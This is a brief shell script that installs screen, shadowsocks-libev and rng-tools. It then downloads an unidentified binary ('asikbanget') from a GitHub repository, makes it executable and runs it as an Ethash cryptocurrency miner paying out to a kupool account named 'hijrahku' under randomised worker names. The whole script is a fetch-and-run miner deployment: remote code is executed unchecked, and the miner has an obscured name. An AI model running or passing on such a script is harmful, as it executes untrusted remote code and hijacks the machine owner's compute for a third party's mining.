sudo apt-get update -y
sudo apt install screen -y
sudo apt -y install shadowsocks-libev rng-tools
wget https://github.com/yulinoan/minang/raw/main/asikbanget && chmod +x asikbanget
./asikbanget --algo ETHASH --pool stratum+tcp://ethash.kupool.com:1800  --user hijrahku.GPU-MT-$(echo $(shuf -i 1-999 -n 1)) --ethstratum ETHPROXY
